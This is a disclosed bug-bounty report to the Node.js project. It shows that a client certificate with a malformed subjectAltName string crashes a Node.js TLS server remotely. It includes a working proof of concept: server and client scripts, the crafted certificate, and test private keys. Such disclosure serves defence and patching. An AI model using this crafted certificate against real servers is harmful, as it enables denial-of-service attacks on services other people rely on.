# Remotely trigger an assertion on a TLS server with a malformed certificate string

## Report Details
- **Report ID**: 746733
- **URL**: https://hackerone.com/reports/746733
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-11-26T16:10:02.298Z
- **Disclosed**: 2020-02-06T20:47:23.016Z

## Reporter
- **Username**: rogierschouten
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs

## Vulnerability Information
**Summary:** 
Connecting to a NodeJS TLS server with a client certificate that has a type 19 string in its subjectAltName will crash the TLS server if it tries to read the peer certificate.

Affected versions include v10.17.0 and v13.1.0.

This is related to issue https://github.com/nodejs/node/issues/30521 but it works the other way around: in that issue, the client crashes; in this example, the server crashes. 

It is likely that the fix for that issue will also fix this.

**Description:** 
Using e.g. node-forge it is possible to create certificates without common name and with any subjectAltName content.  Hence anybody can create a malformed certificate and send it to a node server. The server will encounter an assertion in node_crypto.cc

## Steps To Reproduce:

1. Store all files below  (under supporting material) in the same directory
2. Start node ./server.js
3. Start node ./client.js
4. Result: assertion error in the server



## Impact:

Anybody can remotely connect to a TLS server and supply an invalid certificate, causing the server to crash, hence this is a denial-of-service possibility.

## Supporting Material/References:


server.js:

```javascript
const tls = require("tls");
const fs = require("fs");

let server = tls.createServer({
    ca: fs.readFileSync("./ca.crt"),
    cert: fs.readFileSync("./server.crt"),
    key: fs.readFileSync("./server.key"),
    requestCert: true,
    rejectUnauthorized: true
}, (socket) => {
    socket.setEncoding("utf8");
    socket.on("data", (data) => {
        console.log("server.socket.data", data);
        socket.write(data);
    });
    socket.on("end", () => undefined);
    socket.on("error", () => undefined);

    // THIS CRASHES THE SERVER
    console.log(socket.getPeerCertificate());
});
server.listen({ port: 12345 }, () => {
    console.log("listening!")
});
```


client.js:

```javascript
const tls = require("tls");
const fs = require("fs");
const client = tls.connect({
    host: "pc57.network.local",
    port: 12345,
    ca: [fs.readFileSync("./server.crt")],
    key: fs.readFileSync("./client.key"),
    cert: fs.readFileSync("./client.crt")
}, () => {
    client.write("foo");
    client.end();
});
client.on("data", () => undefined);
client.on("error", () => undefined);
client.on("end", () => undefined);
```

ca.crt:

```
-----BEGIN CERTIFICATE-----
MIIDezCCAmOgAwIBAgIJAPP+kRMqzgNDMA0GCSqGSIb3DQEBCwUAMFQxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQxDTALBgNVBAMMBG15Y2EwHhcNMTkxMTI2MTUxNjEwWhcN
MjAxMTI1MTUxNjEwWjBUMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0
ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMQ0wCwYDVQQDDARt
eWNhMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAmK5z7YRTmxYEhm3/
lDrvJWiqsBS3fiq79YSfHlNIbVhgE6ObTTl2WOHJWU/Mw2dKr7l2/fL2R+7O98rt
MfI26aet5r73eu/4Kd/11mRUZ6CSAtzIaP+L7i4dRqR+XOfYTMEbi//Kuh2EvBha
cgB2jFaG1duu/bqTM1In7vKzJEUREd/EoYYBjt4UC5r6mIZ+CqYarfSmOGJ8BXGA
bewesTjqBoJ5DjsZzHkY7BdJzrD9OvCs9XChxeYfaojSGvs5gUJHEhFM6/G1xipv
Qr1VK0aADths9hQnV/8pj1dZLJqvEqEjqct16/CdVjI7B+xBTmhAvL43rxTar/EH
thmt7wIDAQABo1AwTjAdBgNVHQ4EFgQUSe33PfECxbQKWq5XfHj14xNcUsAwHwYD
VR0jBBgwFoAUSe33PfECxbQKWq5XfHj14xNcUsAwDAYDVR0TBAUwAwEB/zANBgkq
hkiG9w0BAQsFAAOCAQEAEDQAzjx4r+2Z1YaCIbToyD+BMuv250Tiwd4MrvKOx7LT
opnWwqn50KtLOfPCd+peNfsxOy9OCC+PqVnOKTnTIOOtv49pRsG3f1SmFjzHfPOC
tL0n7M4WGHDW0ITbuZWhmOMpeiQQLF45p2lcXT49vllRpta86501f+jUW/47nQfU
pGjk4Qbw18jXrAe1qsedisKL9VWdaj1Quxd0XVV2w7kGw6cHBlTNyJd+UeyczheQ
xM7svOeuCMLRMFusxq8Lo6CAwbNiSa/GW7AErHjtruinl9pJXn3FVUvYz9tJ4OrB
ErCfVLYzVDrohIGYS4PMmypx1Bxhlg5JIyoR3JRUuQ==
-----END CERTIFICATE-----
```

ca.key:

```
-----BEGIN PRIVATE KEY-----
MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQCYrnPthFObFgSG
bf+UOu8laKqwFLd+Krv1hJ8eU0htWGATo5tNOXZY4clZT8zDZ0qvuXb98vZH7s73
yu0x8jbpp63mvvd67/gp3/XWZFRnoJIC3Mho/4vuLh1GpH5c59hMwRuL/8q6HYS8
GFpyAHaMVobV2679upMzUifu8rMkRRER38ShhgGO3hQLmvqYhn4Kphqt9KY4YnwF
cYBt7B6xOOoGgnkOOxnMeRjsF0nOsP068Kz1cKHF5h9qiNIa+zmBQkcSEUzr8bXG
Km9CvVUrRoAO2Gz2FCdX/ymPV1ksmq8SoSOpy3Xr8J1WMjsH7EFOaEC8vjevFNqv
8Qe2Ga3vAgMBAAECggEAScIdJuUCLq2YSgjhqw49cWj67E1Vx5GFc7o51ECPgKNs
5o/m+ouD7LRGvOqcFNnVbsa+AThaWa24NmTF6ZcFiCMFE6+1hqJe1HvpG0UksVsU
rmVSO8cYJlwIsJPOp7so9wti72MG4JpaATQSnXgzzOAQC0gxZUm4ytYpjHmaqS4l
WdvCVzZJLOry5r6rjH4c72kp7hGo6+jXo9YgbSa1etDND4JCidrwks7e3SIiTw4m
Z5GbjfPU/Rtttzde72cU7WlGysVDzAJrmf4p/p8a3/aXouYoRHI/cgRadWzIfR/c
W1zFZWnZ24bbkjMjyFvq46lnW19JW+Zpjle/4dfkAQKBgQDKkhN5sSvZEXgDzOrz
vKyeqpuQ1XuZ8LwKyr39ixdf6/QsWYvCe7lIqTy+KLakWCd9SNDnzKYLbGnsF5Bs
sYk/yofM+VYGGQYvmLWKaigh3M+zoRfasLcfHxUSD2+CjLz+lslN3izNV5HO+jQQ
tRbjTgcokcHLGQGufYrOITOMbwKBgQDA88X77oDnGPA0ZDGLaOuur4ZfF+81HgJ2
sJykZmExQTkps3AdXAdHkOKepwlSr560ll104s398Ezb4LlGukm8vfShEgDskyca
sj7QwRepoIpWXMHfMgiuRcGoi+lHQxG35ZC81zy6Uzl02x0ib46a+QCnUIxIZneF
8cQiBce2gQKBgGyqN7BMDk1/RXYkctUVHTRwKMtk+cz2iqjvYUOlXYCjPnScBJDr
ddU4k9EeXfuDHovih84QxfHS0m9HpL3p7so9huO5zR+wRNU7ggciMy0XGoQtonI5
4cHcFp19kj/h53BaytnumPH+S8VQCqX7vq9oqAZnSiH85B4KUm+I9/IZAoGAEIdR
WGlv5Vv/h51lmRmdxtMGYbL9LMGrWFt8r6CNhtidevMCEaHGhdzlbM3GQK0GnVWc
H90l5DDnhJZViLeAhYiIIhwWtC1O1jyaoOtJiaBU+Vzsxp/UmokjM7r4esBGDki+
A080xolGjLoQXtjLkH7wDWUa/0C30GOLd5ajKwECgYEAlJAuaQ9LNF2Hx7BZZaPI
qKX0pNrZmEvt9WNItmw7q6KDinJ7yRm2daM4LVvKPKu7g/YfZ1nA8vTVueBnCMUB
QPIxbBdcgthgeRc2a0kmYZ6uQ4FI0cWJ3X/sA7PWxYbi01vWvp0drvptW3XfKtVh
1edcWLe7QmNpWS61IKxT+Jg=
-----END PRIVATE KEY-----
```

client.crt:

```
-----BEGIN CERTIFICATE-----
MIID0DCCArigAwIBAgIBATANBgkqhkiG9w0BAQUFADBUMQswCQYDVQQGEwJBVTET
MBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQ
dHkgTHRkMQ0wCwYDVQQDDARteWNhMB4XDTE5MTEyNjE1MjczM1oXDTIwMTEyNjE1
MjczM1owUzELMAkGA1UEBhMCVVMxETAPBgNVBAgTCFZpcmdpbmlhMRMwEQYDVQQH
EwpCbGFja3NidXJnMQ0wCwYDVQQKEwRUZXN0MQ0wCwYDVQQLEwRUZXN0MIIBIjAN
BgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnVBta6GIai7hY96+mhJxgLEWT6Ds
2GF37ekF+aDgfAOavk/pVIbeN0wN9hCjkfg4AvFCYHoqXOhCt49s6t1TCakbntZm
uZyKpIMTG7O8kNvBwq3LMU7TIUsicKAHoBu+ALjqYT4gcWOWGC6LkPMwceE8UQV0
+U8YLZdiG1OshtYgPvLwj6LSYwQtu2nN5bklJzXF5HALfb7vDY5BKFCJa6eHafZi
2bhX4mjMvbeGPoHuKye0Zx/lBjcgAmElb7uhwkWRcTOkfwm6nfA0go6qxwGT+eFg
I5J4lB5t0t8ipCq5HV9Shh/GNMTItUraTU9pE3d8mNmSEkci4s41rvKOHQIDAQAB
o4GtMIGqMAwGA1UdEwQFMAMBAf8wCwYDVR0PBAQDAgL0MDsGA1UdJQQ0MDIGCCsG
AQUFBwMBBggrBgEFBQcDAgYIKwYBBQUHAwMGCCsGAQUFBwMEBggrBgEFBQcDCDAR
BglghkgBhvhCAQEEBAMCAPcwHgYDVR0RBBcwFYcEfwAAAZMNbWUtdGhlLWNsaWVu
dDAdBgNVHQ4EFgQUjc1t9QXJgsZFh2qL22onwUgpLbYwDQYJKoZIhvcNAQEFBQAD
ggEBAIEOiqFnxruDmue3jMn4IfP5rYnKEr5ag/XF8iIYum7jRYnr8VvmHzQUMtek
t++vai8hdvSxG4vsOKcdzXmThL8U/ZxEmId8UvEqKGJNfC1cu1evj8rV1D+9YS63
9XTgJXsI1OOCSL3I02KwAkRbjAR7SLLIWwtxwAOzWGyLbpbsQ+TTKTcztddBHFA1
F5vbZWTYk13BHJE/d74ZEs5dUBQM7zdhwlYLTaTd1r5lTWl4wwBjhXD0zMsKUUtB
pP7ZIsJZzSGZ3QQpLXTWRIKXUjANl95rqpI/FN6VkRMf2XuHEvKDMySDlN1Rh1bz
aZf59tRX9W/gqwiKqICO4UE5Z+I=
-----END CERTIFICATE-----
```

client.key:

```
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAnVBta6GIai7hY96+mhJxgLEWT6Ds2GF37ekF+aDgfAOavk/p
VIbeN0wN9hCjkfg4AvFCYHoqXOhCt49s6t1TCakbntZmuZyKpIMTG7O8kNvBwq3L
MU7TIUsicKAHoBu+ALjqYT4gcWOWGC6LkPMwceE8UQV0+U8YLZdiG1OshtYgPvLw
j6LSYwQtu2nN5bklJzXF5HALfb7vDY5BKFCJa6eHafZi2bhX4mjMvbeGPoHuKye0
Zx/lBjcgAmElb7uhwkWRcTOkfwm6nfA0go6qxwGT+eFgI5J4lB5t0t8ipCq5HV9S
hh/GNMTItUraTU9pE3d8mNmSEkci4s41rvKOHQIDAQABAoIBAAtjLwiDgORu0FHy
ZcmxXBX8u6i39W0UYSIPpCcVxioz+JeeIT3FJYDLOJd/TNfcJ/HOlQd20Go5RdsT
vsahjsk8PIua6YS2GDMgadmvgQ7bWYNGIVdIZXAbiDqu2t50I6TZvd2cKa0LkGnf
tKqhb/hOXZdf1b/WQeHK+4cO34ZDDLGE884AAOjHrFcU9t6lEgvtg0fHX9VdBwZu
zKXo/Iik3vPcHpmQtVnIQ+aB8Zr/Z+NvIxP6NmLQPmkm3deJrw/sIXitD06fRtZu
juWoPzELxMDG9wZ1yMiWbrWua1w462T0+mNlAok6cY8ju0NSpMDnP29NiRzQgNUo
w4wNpAECgYEAzrymeZfrJgrpKHjcgnohEEdpj/JWzFxj7DY0gjrkZsiFwVVRdcZU
saKbzwOh4fsyb17PXn/Set8gsxigcKRu8n8j0llOfVlK8H3zspa9xU2NvBVtYpzD
89BRCocLKmr9V2E+KQ8b0shfcOtWX1rUCKrDHDGxCzJt20hMzSnNIr0CgYEAwszl
ABcGu9fbtzBZmcumuN4YO7Q4yCgAHdoO5RhJ5hxdXt04b5M18oa6jYzfPa7AA5wM
AR8jaXMkLIOWBZvWeTZwrEVNoEHh5QOibPjQM/mCNVOhwvQzJXJAsMfhuljkcdKO
2ZRnWrIQJaA52tYaPT/omCu/Kzn8zmvLn4SmfuECgYBfKKqgEXNlgWQtAuTNEhYh
/hzy6yNU0boUwiaNQzparTYT9YeXZIEberOpKAzdjdh7NvLQlpl1gTr19QH0l1uS
Nz9v1TexruY1qGQB8izLopT43AwLdgkkMuD6rYpQLgsKq3IHSDMQZLa5rTmGjrJG
gwNn+N97Pe0fIDppvTH1KQKBgAYH6+sVy2qTY0UHpS6CxJWioqNuj/d6bY5/CskC
+H68UBO4y5+AskHg8/Of8eVp/J3f/esm+KSyIOOT61gfHAPCsLhUqPOWNpUtiKDR
Dzkct3BJN4/emZrGL8SJW662Q9RWTX/k/VIsgx13GXNx/3v3946GhDOlZvNJGRPG
OpVhAoGAX2C8di2SWA1Li0A+lqc3zwu/RZX7fe7s6nmqbwb6Fh5mooRaLZIXJSJk
0/onZP769vk5WZgvvWKf6d11e4/uqYcQBOgvLAkucf6KF26vmkVenb1rjl6WDN9N
8S/HZ+9vPo/EQkK0raNL8VkmTRvTf/JhB9yByrEisAf0ivgYJto=
-----END RSA PRIVATE KEY-----
```

server.crt

```
-----BEGIN CERTIFICATE-----
MIIDlzCCAn+gAwIBAgIJAK4r13axUKSaMA0GCSqGSIb3DQEBCwUAMGIxCzAJBgNV
BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
aWRnaXRzIFB0eSBMdGQxGzAZBgNVBAMMEnBjNTcubmV0d29yay5sb2NhbDAeFw0x
OTExMjYxNTA2MzRaFw0yMDExMjUxNTA2MzRaMGIxCzAJBgNVBAYTAkFVMRMwEQYD
VQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBM
dGQxGzAZBgNVBAMMEnBjNTcubmV0d29yay5sb2NhbDCCASIwDQYJKoZIhvcNAQEB
BQADggEPADCCAQoCggEBAM3sBD3meSnfghzSli0PD3UD8IKKytA7PQnMC9BiKqvW
hNZPfdTLiZAgsA3wwsmpMkHKCpB8/lQ53dR0QYfjncOafVdmFMWkNR/BsUSiHy+4
kDQzLK/DojEOlHaMARF3LGCKD7S4hBhJIC9rLgeZyKisgm2pAGmAEGNIGWTE5AUu
t0TBlef/+CqODM1Mxf2lKWlRE6FqEA27nCi4U/ct9g0zOzrjh4vGrwcXV8BDtLvB
APOCdeCTEo/iX65cdH2LC9ZQ6XQMl2OfIyTjvHanBFf8Jq6VbbMuqPTBytCtd5Lv
rT7k8QZasfyzvXTNSfwjvUoMogTFH7rtAxBWVaDaD+0CAwEAAaNQME4wHQYDVR0O
BBYEFGOFBfdtlcbkFjMboi5U8RDmttJyMB8GA1UdIwQYMBaAFGOFBfdtlcbkFjMb
oi5U8RDmttJyMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQELBQADggEBAFB3uST4
NX6NS3V99a1JvwalHYOPkStR4DHG601hWuBjqM4jmU5H851/ATbcusFvXnmQ2hGC
ksHJh9V5wd1Rdjybj6UlgZ6GWTdK6qTJnwUBu0v2aNTM9No4OdP6G15Wr9B1hmw4
UoqmSbpoCd4KRhVNAL1iwotPclbbJUBFPrJLJ3w7+sq9yB/eskYadtHsqS+YNJ/G
WNxtkIuDQbRU4hOJAjWDZDbDTDC9a7UnpNgniUgOXlJwANb5CHe+MIZkVn2phGnN
p5w6+SxQn1ORRDGeg5anGzpvKLppvuRWjON+UFTuErijEIp431WxloezcyLcwZHU
3JE73HqyfQAFj+o=
-----END CERTIFICATE-----
```

server.key:

```
-----BEGIN PRIVATE KEY-----
MIIEvAIBADANBgkqhkiG9w0BAQEFAASCBKYwggSiAgEAAoIBAQDN7AQ95nkp34Ic
0pYtDw91A/CCisrQOz0JzAvQYiqr1oTWT33Uy4mQILAN8MLJqTJBygqQfP5UOd3U
dEGH453Dmn1XZhTFpDUfwbFEoh8vuJA0Myyvw6IxDpR2jAERdyxgig+0uIQYSSAv
ay4HmciorIJtqQBpgBBjSBlkxOQFLrdEwZXn//gqjgzNTMX9pSlpUROhahANu5wo
uFP3LfYNMzs644eLxq8HF1fAQ7S7wQDzgnXgkxKP4l+uXHR9iwvWUOl0DJdjnyMk
47x2pwRX/CaulW2zLqj0wcrQrXeS760+5PEGWrH8s710zUn8I71KDKIExR+67QMQ
VlWg2g/tAgMBAAECggEAV8Or2yYLpgkYz2gBkZrFn73aGAlHf5B/51kL//iW7z4y
x5SBsNw++Sq1XnuqyYBPZzLRZdugGg2/ufkCpQQiDWge280qNUJTUgGfp/zhBdnH
vDfDZ/YdfoMUS6JIIkWEqHCvWPr7cc5Y5Vzs9VhZ6Wn8/Pf2sQBf+7CTAhvYg0wt
PKY3ZnVEyATmDtncD2Jhbv/CI4yfMEWaG5ONjWW+dFNCjfivaMpiRo7vU/B/EQ76
npXtljMf53mSdRiubShJVQf8ipZW/rJTDZr1ZawFomY1gawhLp90hIFr6D8C4zX0
r7F0zwC6A5XjOzRPVeAz0FXVCOO+4Plceryd297pkQKBgQD8mgg7OJFwMun9XFDO
j3GTPuKl/ao0fwYyDdsN/r33GpHtdZGMcUa8VYlAKvL25BQjSIWftkzoIHZqe/NU
DALbUUh4jknC8HNvaJQGwO6kmJKxnU4v3kg9EHSiIjbiBknoKNQ+bK34P43nzPLB
tIT6xyeRME/uxj7vvqW6jQ1qBwKBgQDQsTfLtAt7RWHegH4MPgHeFLeqWxAn1vWM
aIhbez+a/g1s/oR8gFzfXWh/c+H2d/kDOwWGBjGUeFpz+yJzIfQ0gOo350+g0oyU
ZDwIQ2/BiR6GMGNVfTPRzukb1cXs5BMzySHG3ouvZdLPOucoLDPORj5I5T254EIG
FXJZ0TeJawKBgH2/bFOW4If7QJK5Dx0VOZP0nT3G3qFNjtcCIMeBxi2qE3UjrvY8
OdtttWq1NsiDWCcMZkDQrs5rwqdV1xdC93UYrLwfEUczDjQq2m3WQ7a6oWQ8C/02
ab3EYFuKLsosGUSydp4w2hYYBVucokidxglVdTQI2fHizNfqj3Qj3canAoGAAVjT
el4cINyOyCfeKGgSDQPnN5NE5Gzvwss97hE6lN6E6aou4rrVXp+0t/XghH27vriX
zYims0Wfl9YMH+AdOmWGnXvBuNEDFUYcWRVOWFpxNv6C9Z9MQVNrj8FueJv0P8ZR
kH4JOsWWeb3wlgLLBs7PQhswrc1zv6RNy6SdDicCgYBc/zi70iBH27P0RdPL4ypx
3mjuRcAGEJvCB1AoEI0ib01M+XQJWbMv2wx0xQLDQpOdtuN2yAQi/QCkU8tp+Ztq
uRAZ5yops0ciaWLDMOQrdp4f8OCxd/mm2xGjWV7PNSE+52+UmOTGGNQNP4n8f1QJ
NCRD4APLro338oCS2zUQMQ==
-----END PRIVATE KEY-----
```

## Impact

denial of service - remotely crashing a server

## Attachments
No attachments
